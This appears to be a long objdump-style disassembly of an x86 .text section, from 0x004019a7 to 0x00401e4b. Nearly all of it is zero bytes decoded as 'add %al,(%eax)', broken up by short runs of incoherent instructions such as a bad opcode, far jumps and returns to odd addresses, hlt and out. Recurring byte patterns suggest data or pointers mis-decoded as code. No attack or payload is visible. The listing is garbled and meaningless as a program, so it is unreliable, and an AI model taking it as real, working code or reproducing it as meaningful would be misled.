                           .text:004019a7 30 40 cb                         xor    %al,-0x35(%eax)
                           .text:004019aa 90                               nop
                           .text:004019ab ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:004019b0 b0 58                            mov    $0x58,%al
                           .text:004019b2 70 00                            jo     0x004019b4
                           .text:004019b4 00 00                            add    %al,(%eax)
                           .text:004019b6 00 00                            add    %al,(%eax)
                           .text:004019b8 00 00                            add    %al,(%eax)
                           .text:004019ba 00 00                            add    %al,(%eax)
                           .text:004019bc 00 00                            add    %al,(%eax)
                           .text:004019be 00 00                            add    %al,(%eax)
                           .text:004019c0 00 00                            add    %al,(%eax)
                           .text:004019c2 00 00                            add    %al,(%eax)
                           .text:004019c4 00 00                            add    %al,(%eax)
                           .text:004019c6 00 00                            add    %al,(%eax)
                           .text:004019c8 00 00                            add    %al,(%eax)
                           .text:004019ca 00 00                            add    %al,(%eax)
                           .text:004019cc 00 00                            add    %al,(%eax)
                           .text:004019ce 00 00                            add    %al,(%eax)
                           .text:004019d0 00 00                            add    %al,(%eax)
                           .text:004019d2 00 00                            add    %al,(%eax)
                           .text:004019d4 00 00                            add    %al,(%eax)
                           .text:004019d6 00 00                            add    %al,(%eax)
                           .text:004019d8 00 00                            add    %al,(%eax)
                           .text:004019da 00 00                            add    %al,(%eax)
                           .text:004019dc 00 00                            add    %al,(%eax)
                           .text:004019de 00 00                            add    %al,(%eax)
                           .text:004019e0 00 00                            add    %al,(%eax)
                           .text:004019e2 00 00                            add    %al,(%eax)
                           .text:004019e4 00 00                            add    %al,(%eax)
                           .text:004019e6 00 00                            add    %al,(%eax)
                           .text:004019e8 00 00                            add    %al,(%eax)
                           .text:004019ea 00 00                            add    %al,(%eax)
                           .text:004019ec 00 00                            add    %al,(%eax)
                           .text:004019ee 00 00                            add    %al,(%eax)
                           .text:004019f0 00 00                            add    %al,(%eax)
                           .text:004019f2 00 00                            add    %al,(%eax)
                           .text:004019f4 00 00                            add    %al,(%eax)
                           .text:004019f6 00 00                            add    %al,(%eax)
                           .text:004019f8 00 00                            add    %al,(%eax)
                           .text:004019fa 00 00                            add    %al,(%eax)
                           .text:004019fc 00 00                            add    %al,(%eax)
                           .text:004019fe 00 00                            add    %al,(%eax)
                           .text:00401a00 00 00                            add    %al,(%eax)
                           .text:00401a02 00 00                            add    %al,(%eax)
                           .text:00401a04 00 00                            add    %al,(%eax)
                           .text:00401a06 00 00                            add    %al,(%eax)
                           .text:00401a08 00 00                            add    %al,(%eax)
                           .text:00401a0a 00 00                            add    %al,(%eax)
                           .text:00401a0c 00 00                            add    %al,(%eax)
                           .text:00401a0e 00 00                            add    %al,(%eax)
                           .text:00401a10 00 00                            add    %al,(%eax)
                           .text:00401a12 00 00                            add    %al,(%eax)
                           .text:00401a14 00 00                            add    %al,(%eax)
                           .text:00401a16 00 00                            add    %al,(%eax)
                           .text:00401a18 00 00                            add    %al,(%eax)
                           .text:00401a1a 00 00                            add    %al,(%eax)
                           .text:00401a1c 00 00                            add    %al,(%eax)
                           .text:00401a1e 00 00                            add    %al,(%eax)
                           .text:00401a20 00 00                            add    %al,(%eax)
                           .text:00401a22 00 00                            add    %al,(%eax)
                           .text:00401a24 00 00                            add    %al,(%eax)
                           .text:00401a26 00 00                            add    %al,(%eax)
                           .text:00401a28 00 00                            add    %al,(%eax)
                           .text:00401a2a 00 00                            add    %al,(%eax)
                           .text:00401a2c 00 00                            add    %al,(%eax)
                           .text:00401a2e 00 00                            add    %al,(%eax)
                           .text:00401a30 00 00                            add    %al,(%eax)
                           .text:00401a32 00 00                            add    %al,(%eax)
                           .text:00401a34 00 00                            add    %al,(%eax)
                           .text:00401a36 00 00                            add    %al,(%eax)
                           .text:00401a38 00 00                            add    %al,(%eax)
                           .text:00401a3a 00 00                            add    %al,(%eax)
                           .text:00401a3c 00 00                            add    %al,(%eax)
                           .text:00401a3e 00 00                            add    %al,(%eax)
                           .text:00401a40 00 00                            add    %al,(%eax)
                           .text:00401a42 00 00                            add    %al,(%eax)
                           .text:00401a44 00 00                            add    %al,(%eax)
                           .text:00401a46 00 00                            add    %al,(%eax)
                           .text:00401a48 00 00                            add    %al,(%eax)
                           .text:00401a4a 00 00                            add    %al,(%eax)
                           .text:00401a4c 00 00                            add    %al,(%eax)
                           .text:00401a4e 00 00                            add    %al,(%eax)
                           .text:00401a50 00 00                            add    %al,(%eax)
                           .text:00401a52 00 00                            add    %al,(%eax)
                           .text:00401a54 00 00                            add    %al,(%eax)
                           .text:00401a56 00 00                            add    %al,(%eax)
                           .text:00401a58 00 00                            add    %al,(%eax)
                           .text:00401a5a 00 00                            add    %al,(%eax)
                           .text:00401a5c 00 00                            add    %al,(%eax)
                           .text:00401a5e 00 00                            add    %al,(%eax)
                           .text:00401a60 00 00                            add    %al,(%eax)
                           .text:00401a62 00 00                            add    %al,(%eax)
                           .text:00401a64 00 00                            add    %al,(%eax)
                           .text:00401a66 00 00                            add    %al,(%eax)
                           .text:00401a68 00 00                            add    %al,(%eax)
                           .text:00401a6a 00 00                            add    %al,(%eax)
                           .text:00401a6c 00 00                            add    %al,(%eax)
                           .text:00401a6e 00 00                            add    %al,(%eax)
                           .text:00401a70 00 00                            add    %al,(%eax)
                           .text:00401a72 00 00                            add    %al,(%eax)
                           .text:00401a74 00 00                            add    %al,(%eax)
                           .text:00401a76 00 00                            add    %al,(%eax)
                           .text:00401a78 00 00                            add    %al,(%eax)
                           .text:00401a7a 00 00                            add    %al,(%eax)
                           .text:00401a7c 00 00                            add    %al,(%eax)
                           .text:00401a7e 00 00                            add    %al,(%eax)
                           .text:00401a80 00 00                            add    %al,(%eax)
                           .text:00401a82 00 00                            add    %al,(%eax)
                           .text:00401a84 00 00                            add    %al,(%eax)
                           .text:00401a86 00 00                            add    %al,(%eax)
                           .text:00401a88 00 00                            add    %al,(%eax)
                           .text:00401a8a 00 00                            add    %al,(%eax)
                           .text:00401a8c 00 00                            add    %al,(%eax)
                           .text:00401a8e 00 00                            add    %al,(%eax)
                           .text:00401a90 50                               push   %eax
                           .text:00401a91 e8 a8 25 8f f3                   call   0xf3cf403e
                           .text:00401a96 5d                               pop    %ebp
                           .text:00401a97 53                               push   %ebx
                           .text:00401a98 10 cb                            adc    %cl,%bl
                           .text:00401a9a 90                               nop
                           .text:00401a9b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401aa0 80 58 70 00                      sbbb   $0x0,0x70(%eax)
                           .text:00401aa4 00 00                            add    %al,(%eax)
                           .text:00401aa6 00 00                            add    %al,(%eax)
                           .text:00401aa8 00 00                            add    %al,(%eax)
                           .text:00401aaa 00 00                            add    %al,(%eax)
                           .text:00401aac 00 00                            add    %al,(%eax)
                           .text:00401aae 00 00                            add    %al,(%eax)
                           .text:00401ab0 00 00                            add    %al,(%eax)
                           .text:00401ab2 00 00                            add    %al,(%eax)
                           .text:00401ab4 00 00                            add    %al,(%eax)
                           .text:00401ab6 00 00                            add    %al,(%eax)
                           .text:00401ab8 00 00                            add    %al,(%eax)
                           .text:00401aba 00 00                            add    %al,(%eax)
                           .text:00401abc 00 00                            add    %al,(%eax)
                           .text:00401abe 00 00                            add    %al,(%eax)
                           .text:00401ac0 00 00                            add    %al,(%eax)
                           .text:00401ac2 00 00                            add    %al,(%eax)
                           .text:00401ac4 00 00                            add    %al,(%eax)
                           .text:00401ac6 00 00                            add    %al,(%eax)
                           .text:00401ac8 00 00                            add    %al,(%eax)
                           .text:00401aca 00 00                            add    %al,(%eax)
                           .text:00401acc 00 00                            add    %al,(%eax)
                           .text:00401ace 00 00                            add    %al,(%eax)
                           .text:00401ad0 00 00                            add    %al,(%eax)
                           .text:00401ad2 00 00                            add    %al,(%eax)
                           .text:00401ad4 00 00                            add    %al,(%eax)
                           .text:00401ad6 00 00                            add    %al,(%eax)
                           .text:00401ad8 d3 88 a6 73 f8 10                rorl   %cl,0x10f873a6(%eax)
                           .text:00401ade 10 46 e0                         adc    %al,-0x20(%esi)
                           .text:00401ae1 ca 90 ba                         lret   $0xba90
                           .text:00401ae4 bf 7f 00 00 b0                   mov    $0xb000007f,%edi
                           .text:00401ae9 58                               pop    %eax
                           .text:00401aea 70 00                            jo     0x00401aec
                           .text:00401aec 00 00                            add    %al,(%eax)
                           .text:00401aee 00 00                            add    %al,(%eax)
                           .text:00401af0 00 00                            add    %al,(%eax)
                           .text:00401af2 00 00                            add    %al,(%eax)
                           .text:00401af4 00 00                            add    %al,(%eax)
                           .text:00401af6 00 00                            add    %al,(%eax)
                           .text:00401af8 00 00                            add    %al,(%eax)
                           .text:00401afa 00 00                            add    %al,(%eax)
                           .text:00401afc 00 00                            add    %al,(%eax)
                           .text:00401afe 00 00                            add    %al,(%eax)
                           .text:00401b00 00 00                            add    %al,(%eax)
                           .text:00401b02 00 00                            add    %al,(%eax)
                           .text:00401b04 00 00                            add    %al,(%eax)
                           .text:00401b06 00 00                            add    %al,(%eax)
                           .text:00401b08 55                               push   %ebp
                           .text:00401b09 27                               daa    
                           .text:00401b0a b1 76                            mov    $0x76,%cl
                           .text:00401b0c 2a f8                            sub    %al,%bh
                           .text:00401b0e 61                               popa   
                           .text:00401b0f df e8                            fucomip %st(0),%st
                           .text:00401b11 53                               push   %ebx
                           .text:00401b12 1f                               pop    %ds
                           .text:00401b13 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401b18 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401b1b c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401b21 00 00                            add    %al,(%eax)
                           .text:00401b23 00 00                            add    %al,(%eax)
                           .text:00401b25 00 00                            add    %al,(%eax)
                           .text:00401b27 00 00                            add    %al,(%eax)
                           .text:00401b29 00 00                            add    %al,(%eax)
                           .text:00401b2b 00 00                            add    %al,(%eax)
                           .text:00401b2d 00 00                            add    %al,(%eax)
                           .text:00401b2f 00 00                            add    %al,(%eax)
                           .text:00401b31 00 00                            add    %al,(%eax)
                           .text:00401b33 00 00                            add    %al,(%eax)
                           .text:00401b35 00 00                            add    %al,(%eax)
                           .text:00401b37 00 d7                            add    %dl,%bh
                           .text:00401b39 be a7 51 6b b7                   mov    $0xb76b51a7,%esi
                           .text:00401b3e 9b                               fwait
                           .text:00401b3f 56                               push   %esi
                           .text:00401b40 00 c6                            add    %al,%dh
                           .text:00401b42 90                               nop
                           .text:00401b43 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401b48 30 5b f4                         xor    %bl,-0xc(%ebx)
                           .text:00401b4b b5 bf                            mov    $0xbf,%ch
                           .text:00401b4d 7f 00                            jg     0x00401b4f
                           .text:00401b4f 00 00                            add    %al,(%eax)
                           .text:00401b51 00 00                            add    %al,(%eax)
                           .text:00401b53 00 00                            add    %al,(%eax)
                           .text:00401b55 00 00                            add    %al,(%eax)
                           .text:00401b57 00 00                            add    %al,(%eax)
                           .text:00401b59 00 00                            add    %al,(%eax)
                           .text:00401b5b 00 00                            add    %al,(%eax)
                           .text:00401b5d 00 00                            add    %al,(%eax)
                           .text:00401b5f 00 00                            add    %al,(%eax)
                           .text:00401b61 00 00                            add    %al,(%eax)
                           .text:00401b63 00 00                            add    %al,(%eax)
                           .text:00401b65 00 00                            add    %al,(%eax)
                           .text:00401b67 00 00                            add    %al,(%eax)
                           .text:00401b69 00 00                            add    %al,(%eax)
                           .text:00401b6b 00 00                            add    %al,(%eax)
                           .text:00401b6d 00 00                            add    %al,(%eax)
                           .text:00401b6f 00 00                            add    %al,(%eax)
                           .text:00401b71 00 00                            add    %al,(%eax)
                           .text:00401b73 00 00                            add    %al,(%eax)
                           .text:00401b75 00 00                            add    %al,(%eax)
                           .text:00401b77 00 00                            add    %al,(%eax)
                           .text:00401b79 00 00                            add    %al,(%eax)
                           .text:00401b7b 00 00                            add    %al,(%eax)
                           .text:00401b7d 00 00                            add    %al,(%eax)
                           .text:00401b7f 00 00                            add    %al,(%eax)
                           .text:00401b81 00 00                            add    %al,(%eax)
                           .text:00401b83 00 00                            add    %al,(%eax)
                           .text:00401b85 00 00                            add    %al,(%eax)
                           .text:00401b87 00 00                            add    %al,(%eax)
                           .text:00401b89 00 00                            add    %al,(%eax)
                           .text:00401b8b 00 00                            add    %al,(%eax)
                           .text:00401b8d 00 00                            add    %al,(%eax)
                           .text:00401b8f 00 00                            add    %al,(%eax)
                           .text:00401b91 00 00                            add    %al,(%eax)
                           .text:00401b93 00 00                            add    %al,(%eax)
                           .text:00401b95 00 00                            add    %al,(%eax)
                           .text:00401b97 00 5b 7f                         add    %bl,0x7f(%ebx)
                           .text:00401b9a ea 4c 6b 75 32 a2 20             ljmp   $0x20a2,$0x32756b4c
                           .text:00401ba1 54                               push   %esp
                           .text:00401ba2 1f                               pop    %ds
                           .text:00401ba3 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401ba8 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401bab c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401bb1 00 00                            add    %al,(%eax)
                           .text:00401bb3 00 00                            add    %al,(%eax)
                           .text:00401bb5 00 00                            add    %al,(%eax)
                           .text:00401bb7 00 00                            add    %al,(%eax)
                           .text:00401bb9 00 00                            add    %al,(%eax)
                           .text:00401bbb 00 00                            add    %al,(%eax)
                           .text:00401bbd 00 00                            add    %al,(%eax)
                           .text:00401bbf 00 00                            add    %al,(%eax)
                           .text:00401bc1 00 00                            add    %al,(%eax)
                           .text:00401bc3 00 00                            add    %al,(%eax)
                           .text:00401bc5 00 00                            add    %al,(%eax)
                           .text:00401bc7 00 dd                            add    %bl,%ch
                           .text:00401bc9 14 de                            adc    $0xde,%al
                           .text:00401bcb 7f 8a                            jg     0x00401b57
                           .text:00401bcd b5 b0                            mov    $0xb0,%ch
                           .text:00401bcf 69 b0 ca 90 ba bf 7f 00 00 80    imul   $0x8000007f,-0x40456f36(%eax),%esi
                           .text:00401bd9 58                               pop    %eax
                           .text:00401bda 70 00                            jo     0x00401bdc
                           .text:00401bdc 00 00                            add    %al,(%eax)
                           .text:00401bde 00 00                            add    %al,(%eax)
                           .text:00401be0 00 00                            add    %al,(%eax)
                           .text:00401be2 00 00                            add    %al,(%eax)
                           .text:00401be4 00 00                            add    %al,(%eax)
                           .text:00401be6 00 00                            add    %al,(%eax)
                           .text:00401be8 00 00                            add    %al,(%eax)
                           .text:00401bea 00 00                            add    %al,(%eax)
                           .text:00401bec 00 00                            add    %al,(%eax)
                           .text:00401bee 00 00                            add    %al,(%eax)
                           .text:00401bf0 00 00                            add    %al,(%eax)
                           .text:00401bf2 00 00                            add    %al,(%eax)
                           .text:00401bf4 00 00                            add    %al,(%eax)
                           .text:00401bf6 00 00                            add    %al,(%eax)
                           .text:00401bf8 00 00                            add    %al,(%eax)
                           .text:00401bfa 00 00                            add    %al,(%eax)
                           .text:00401bfc 00 00                            add    %al,(%eax)
                           .text:00401bfe 00 00                            add    %al,(%eax)
                           .text:00401c00 00 00                            add    %al,(%eax)
                           .text:00401c02 00 00                            add    %al,(%eax)
                           .text:00401c04 00 00                            add    %al,(%eax)
                           .text:00401c06 00 00                            add    %al,(%eax)
                           .text:00401c08 00 00                            add    %al,(%eax)
                           .text:00401c0a 00 00                            add    %al,(%eax)
                           .text:00401c0c 00 00                            add    %al,(%eax)
                           .text:00401c0e 00 00                            add    %al,(%eax)
                           .text:00401c10 00 00                            add    %al,(%eax)
                           .text:00401c12 00 00                            add    %al,(%eax)
                           .text:00401c14 00 00                            add    %al,(%eax)
                           .text:00401c16 00 00                            add    %al,(%eax)
                           .text:00401c18 00 00                            add    %al,(%eax)
                           .text:00401c1a 00 00                            add    %al,(%eax)
                           .text:00401c1c 00 00                            add    %al,(%eax)
                           .text:00401c1e 00 00                            add    %al,(%eax)
                           .text:00401c20 00 00                            add    %al,(%eax)
                           .text:00401c22 00 00                            add    %al,(%eax)
                           .text:00401c24 00 00                            add    %al,(%eax)
                           .text:00401c26 00 00                            add    %al,(%eax)
                           .text:00401c28 00 00                            add    %al,(%eax)
                           .text:00401c2a 00 00                            add    %al,(%eax)
                           .text:00401c2c 00 00                            add    %al,(%eax)
                           .text:00401c2e 00 00                            add    %al,(%eax)
                           .text:00401c30 00 00                            add    %al,(%eax)
                           .text:00401c32 00 00                            add    %al,(%eax)
                           .text:00401c34 00 00                            add    %al,(%eax)
                           .text:00401c36 00 00                            add    %al,(%eax)
                           .text:00401c38 00 00                            add    %al,(%eax)
                           .text:00401c3a 00 00                            add    %al,(%eax)
                           .text:00401c3c 00 00                            add    %al,(%eax)
                           .text:00401c3e 00 00                            add    %al,(%eax)
                           .text:00401c40 00 00                            add    %al,(%eax)
                           .text:00401c42 00 00                            add    %al,(%eax)
                           .text:00401c44 00 00                            add    %al,(%eax)
                           .text:00401c46 00 00                            add    %al,(%eax)
                           .text:00401c48 00 00                            add    %al,(%eax)
                           .text:00401c4a 00 00                            add    %al,(%eax)
                           .text:00401c4c 00 00                            add    %al,(%eax)
                           .text:00401c4e 00 00                            add    %al,(%eax)
                           .text:00401c50 00 00                            add    %al,(%eax)
                           .text:00401c52 00 00                            add    %al,(%eax)
                           .text:00401c54 00 00                            add    %al,(%eax)
                           .text:00401c56 00 00                            add    %al,(%eax)
                           .text:00401c58 00 00                            add    %al,(%eax)
                           .text:00401c5a 00 00                            add    %al,(%eax)
                           .text:00401c5c 00 00                            add    %al,(%eax)
                           .text:00401c5e 00 00                            add    %al,(%eax)
                           .text:00401c60 00 00                            add    %al,(%eax)
                           .text:00401c62 00 00                            add    %al,(%eax)
                           .text:00401c64 00 00                            add    %al,(%eax)
                           .text:00401c66 00 00                            add    %al,(%eax)
                           .text:00401c68 00 00                            add    %al,(%eax)
                           .text:00401c6a 00 00                            add    %al,(%eax)
                           .text:00401c6c 00 00                            add    %al,(%eax)
                           .text:00401c6e 00 00                            add    %al,(%eax)
                           .text:00401c70 00 00                            add    %al,(%eax)
                           .text:00401c72 00 00                            add    %al,(%eax)
                           .text:00401c74 00 00                            add    %al,(%eax)
                           .text:00401c76 00 00                            add    %al,(%eax)
                           .text:00401c78 00 00                            add    %al,(%eax)
                           .text:00401c7a 00 00                            add    %al,(%eax)
                           .text:00401c7c 00 00                            add    %al,(%eax)
                           .text:00401c7e 00 00                            add    %al,(%eax)
                           .text:00401c80 00 00                            add    %al,(%eax)
                           .text:00401c82 00 00                            add    %al,(%eax)
                           .text:00401c84 00 00                            add    %al,(%eax)
                           .text:00401c86 00 00                            add    %al,(%eax)
                           .text:00401c88 00 00                            add    %al,(%eax)
                           .text:00401c8a 00 00                            add    %al,(%eax)
                           .text:00401c8c 00 00                            add    %al,(%eax)
                           .text:00401c8e 00 00                            add    %al,(%eax)
                           .text:00401c90 00 00                            add    %al,(%eax)
                           .text:00401c92 00 00                            add    %al,(%eax)
                           .text:00401c94 00 00                            add    %al,(%eax)
                           .text:00401c96 00 00                            add    %al,(%eax)
                           .text:00401c98 00 00                            add    %al,(%eax)
                           .text:00401c9a 00 00                            add    %al,(%eax)
                           .text:00401c9c 00 00                            add    %al,(%eax)
                           .text:00401c9e 00 00                            add    %al,(%eax)
                           .text:00401ca0 e6 a5                            out    %al,$0xa5
                           .text:00401ca2 dd 69 d2                         (bad)  -0x2e(%ecx)
                           .text:00401ca5 a3 8a 8a 00 cc                   mov    %eax,0xcc008a8a
                           .text:00401caa 90                               nop
                           .text:00401cab ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401cb0 f0 00 6b ba                      lock add %ch,-0x46(%ebx)
                           .text:00401cb4 bf 7f 00 00 e7                   mov    $0xe700007f,%edi
                           .text:00401cb9 32 3a                            xor    (%edx),%bh
                           .text:00401cbb 79 02                            jns    0x00401cbf
                           .text:00401cbd 5c                               pop    %esp
                           .text:00401cbe 9f                               lahf   
                           .text:00401cbf 8a a0 cb 90 ba bf                mov    -0x40456f35(%eax),%ah
                           .text:00401cc5 7f 00                            jg     0x00401cc7
                           .text:00401cc7 00 08                            add    %cl,(%eax)
                           .text:00401cc9 55                               push   %ebp
                           .text:00401cca 6d                               insl   (%dx),%es:(%edi)
                           .text:00401ccb c5 bf 7f 00 00 68                lds    0x6800007f(%edi),%edi
                           .text:00401cd1 19 74 74 a6                      sbb    %esi,-0x5a(%esp,%esi,2)
                           .text:00401cd5 1b 75 71                         sbb    0x71(%ebp),%esi
                           .text:00401cd8 70 cb                            jo     0x00401ca5
                           .text:00401cda 90                               nop
                           .text:00401cdb ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401ce0 20 b7 2e 04 00 00                and    %dh,0x42e(%edi)
                           .text:00401ce6 00 00                            add    %al,(%eax)
                           .text:00401ce8 00 00                            add    %al,(%eax)
                           .text:00401cea 00 00                            add    %al,(%eax)
                           .text:00401cec 00 00                            add    %al,(%eax)
                           .text:00401cee 00 00                            add    %al,(%eax)
                           .text:00401cf0 00 00                            add    %al,(%eax)
                           .text:00401cf2 00 00                            add    %al,(%eax)
                           .text:00401cf4 00 00                            add    %al,(%eax)
                           .text:00401cf6 00 00                            add    %al,(%eax)
                           .text:00401cf8 00 00                            add    %al,(%eax)
                           .text:00401cfa 00 00                            add    %al,(%eax)
                           .text:00401cfc 00 00                            add    %al,(%eax)
                           .text:00401cfe 00 00                            add    %al,(%eax)
                           .text:00401d00 00 00                            add    %al,(%eax)
                           .text:00401d02 00 00                            add    %al,(%eax)
                           .text:00401d04 00 00                            add    %al,(%eax)
                           .text:00401d06 00 00                            add    %al,(%eax)
                           .text:00401d08 00 00                            add    %al,(%eax)
                           .text:00401d0a 00 00                            add    %al,(%eax)
                           .text:00401d0c 00 00                            add    %al,(%eax)
                           .text:00401d0e 00 00                            add    %al,(%eax)
                           .text:00401d10 00 00                            add    %al,(%eax)
                           .text:00401d12 00 00                            add    %al,(%eax)
                           .text:00401d14 00 00                            add    %al,(%eax)
                           .text:00401d16 00 00                            add    %al,(%eax)
                           .text:00401d18 00 00                            add    %al,(%eax)
                           .text:00401d1a 00 00                            add    %al,(%eax)
                           .text:00401d1c 00 00                            add    %al,(%eax)
                           .text:00401d1e 00 00                            add    %al,(%eax)
                           .text:00401d20 00 00                            add    %al,(%eax)
                           .text:00401d22 00 00                            add    %al,(%eax)
                           .text:00401d24 00 00                            add    %al,(%eax)
                           .text:00401d26 00 00                            add    %al,(%eax)
                           .text:00401d28 00 00                            add    %al,(%eax)
                           .text:00401d2a 00 00                            add    %al,(%eax)
                           .text:00401d2c 00 00                            add    %al,(%eax)
                           .text:00401d2e 00 00                            add    %al,(%eax)
                           .text:00401d30 00 00                            add    %al,(%eax)
                           .text:00401d32 00 00                            add    %al,(%eax)
                           .text:00401d34 00 00                            add    %al,(%eax)
                           .text:00401d36 00 00                            add    %al,(%eax)
                           .text:00401d38 00 00                            add    %al,(%eax)
                           .text:00401d3a 00 00                            add    %al,(%eax)
                           .text:00401d3c 00 00                            add    %al,(%eax)
                           .text:00401d3e 00 00                            add    %al,(%eax)
                           .text:00401d40 00 00                            add    %al,(%eax)
                           .text:00401d42 00 00                            add    %al,(%eax)
                           .text:00401d44 00 00                            add    %al,(%eax)
                           .text:00401d46 00 00                            add    %al,(%eax)
                           .text:00401d48 00 00                            add    %al,(%eax)
                           .text:00401d4a 00 00                            add    %al,(%eax)
                           .text:00401d4c 00 00                            add    %al,(%eax)
                           .text:00401d4e 00 00                            add    %al,(%eax)
                           .text:00401d50 00 00                            add    %al,(%eax)
                           .text:00401d52 00 00                            add    %al,(%eax)
                           .text:00401d54 00 00                            add    %al,(%eax)
                           .text:00401d56 00 00                            add    %al,(%eax)
                           .text:00401d58 00 00                            add    %al,(%eax)
                           .text:00401d5a 00 00                            add    %al,(%eax)
                           .text:00401d5c 00 00                            add    %al,(%eax)
                           .text:00401d5e 00 00                            add    %al,(%eax)
                           .text:00401d60 00 00                            add    %al,(%eax)
                           .text:00401d62 00 00                            add    %al,(%eax)
                           .text:00401d64 00 00                            add    %al,(%eax)
                           .text:00401d66 00 00                            add    %al,(%eax)
                           .text:00401d68 00 00                            add    %al,(%eax)
                           .text:00401d6a 00 00                            add    %al,(%eax)
                           .text:00401d6c 00 00                            add    %al,(%eax)
                           .text:00401d6e 00 00                            add    %al,(%eax)
                           .text:00401d70 00 00                            add    %al,(%eax)
                           .text:00401d72 00 00                            add    %al,(%eax)
                           .text:00401d74 00 00                            add    %al,(%eax)
                           .text:00401d76 00 00                            add    %al,(%eax)
                           .text:00401d78 00 00                            add    %al,(%eax)
                           .text:00401d7a 00 00                            add    %al,(%eax)
                           .text:00401d7c 00 00                            add    %al,(%eax)
                           .text:00401d7e 00 00                            add    %al,(%eax)
                           .text:00401d80 00 00                            add    %al,(%eax)
                           .text:00401d82 00 00                            add    %al,(%eax)
                           .text:00401d84 00 00                            add    %al,(%eax)
                           .text:00401d86 00 00                            add    %al,(%eax)
                           .text:00401d88 00 00                            add    %al,(%eax)
                           .text:00401d8a 00 00                            add    %al,(%eax)
                           .text:00401d8c 00 00                            add    %al,(%eax)
                           .text:00401d8e 00 00                            add    %al,(%eax)
                           .text:00401d90 00 00                            add    %al,(%eax)
                           .text:00401d92 00 00                            add    %al,(%eax)
                           .text:00401d94 00 00                            add    %al,(%eax)
                           .text:00401d96 00 00                            add    %al,(%eax)
                           .text:00401d98 00 00                            add    %al,(%eax)
                           .text:00401d9a 00 00                            add    %al,(%eax)
                           .text:00401d9c 00 00                            add    %al,(%eax)
                           .text:00401d9e 00 00                            add    %al,(%eax)
                           .text:00401da0 00 00                            add    %al,(%eax)
                           .text:00401da2 00 00                            add    %al,(%eax)
                           .text:00401da4 00 00                            add    %al,(%eax)
                           .text:00401da6 00 00                            add    %al,(%eax)
                           .text:00401da8 00 00                            add    %al,(%eax)
                           .text:00401daa 00 00                            add    %al,(%eax)
                           .text:00401dac 00 00                            add    %al,(%eax)
                           .text:00401dae 00 00                            add    %al,(%eax)
                           .text:00401db0 00 00                            add    %al,(%eax)
                           .text:00401db2 00 00                            add    %al,(%eax)
                           .text:00401db4 00 00                            add    %al,(%eax)
                           .text:00401db6 00 00                            add    %al,(%eax)
                           .text:00401db8 00 00                            add    %al,(%eax)
                           .text:00401dba 00 00                            add    %al,(%eax)
                           .text:00401dbc 00 00                            add    %al,(%eax)
                           .text:00401dbe 00 00                            add    %al,(%eax)
                           .text:00401dc0 00 00                            add    %al,(%eax)
                           .text:00401dc2 00 00                            add    %al,(%eax)
                           .text:00401dc4 00 00                            add    %al,(%eax)
                           .text:00401dc6 00 00                            add    %al,(%eax)
                           .text:00401dc8 00 00                            add    %al,(%eax)
                           .text:00401dca 00 00                            add    %al,(%eax)
                           .text:00401dcc 00 00                            add    %al,(%eax)
                           .text:00401dce 00 00                            add    %al,(%eax)
                           .text:00401dd0 00 00                            add    %al,(%eax)
                           .text:00401dd2 00 00                            add    %al,(%eax)
                           .text:00401dd4 00 00                            add    %al,(%eax)
                           .text:00401dd6 00 00                            add    %al,(%eax)
                           .text:00401dd8 f3 e9 92 d0 38 b1                repz jmp 0xb178ee70
                           .text:00401dde fb                               sti    
                           .text:00401ddf 44                               inc    %esp
                           .text:00401de0 70 08                            jo     0x00401dea
                           .text:00401de2 6b ba bf 7f 00 00 b0             imul   $0xffffffb0,0x7fbf(%edx),%edi
                           .text:00401de9 58                               pop    %eax
                           .text:00401dea 70 00                            jo     0x00401dec
                           .text:00401dec 00 00                            add    %al,(%eax)
                           .text:00401dee 00 00                            add    %al,(%eax)
                           .text:00401df0 f4                               hlt    
                           .text:00401df1 2c 85                            sub    $0x85,%al
                           .text:00401df3 bc 6d 52 ad 0b                   mov    $0xbad526d,%esp
                           .text:00401df8 f0 06                            lock push %es
                           .text:00401dfa 6b ba bf 7f 00 00 90             imul   $0xffffff90,0x7fbf(%edx),%edi
                           .text:00401e01 2e f3 b5 bf                      cs repz mov $0xbf,%ch
                           .text:00401e05 7f 00                            jg     0x00401e07
                           .text:00401e07 00 00                            add    %al,(%eax)
                           .text:00401e09 00 00                            add    %al,(%eax)
                           .text:00401e0b 00 00                            add    %al,(%eax)
                           .text:00401e0d 00 00                            add    %al,(%eax)
                           .text:00401e0f 00 00                            add    %al,(%eax)
                           .text:00401e11 00 00                            add    %al,(%eax)
                           .text:00401e13 00 00                            add    %al,(%eax)
                           .text:00401e15 00 00                            add    %al,(%eax)
                           .text:00401e17 00 00                            add    %al,(%eax)
                           .text:00401e19 00 00                            add    %al,(%eax)
                           .text:00401e1b 00 00                            add    %al,(%eax)
                           .text:00401e1d 00 00                            add    %al,(%eax)
                           .text:00401e1f 00 00                            add    %al,(%eax)
                           .text:00401e21 00 00                            add    %al,(%eax)
                           .text:00401e23 00 00                            add    %al,(%eax)
                           .text:00401e25 00 00                            add    %al,(%eax)
                           .text:00401e27 00 00                            add    %al,(%eax)
                           .text:00401e29 00 00                            add    %al,(%eax)
                           .text:00401e2b 00 00                            add    %al,(%eax)
                           .text:00401e2d 00 00                            add    %al,(%eax)
                           .text:00401e2f 00 00                            add    %al,(%eax)
                           .text:00401e31 00 00                            add    %al,(%eax)
                           .text:00401e33 00 00                            add    %al,(%eax)
                           .text:00401e35 00 00                            add    %al,(%eax)
                           .text:00401e37 00 00                            add    %al,(%eax)
                           .text:00401e39 00 00                            add    %al,(%eax)
                           .text:00401e3b 00 00                            add    %al,(%eax)
                           .text:00401e3d 00 00                            add    %al,(%eax)
                           .text:00401e3f 00 00                            add    %al,(%eax)
                           .text:00401e41 00 00                            add    %al,(%eax)
                           .text:00401e43 00 00                            add    %al,(%eax)
                           .text:00401e45 00 00                            add    %al,(%eax)
                           .text:00401e47 00 00                            add    %al,(%eax)
                           .text:00401e49 00 00                            add    %al,(%eax)
                           .text:00401e4b 00 00                            add    %al,(%eax)
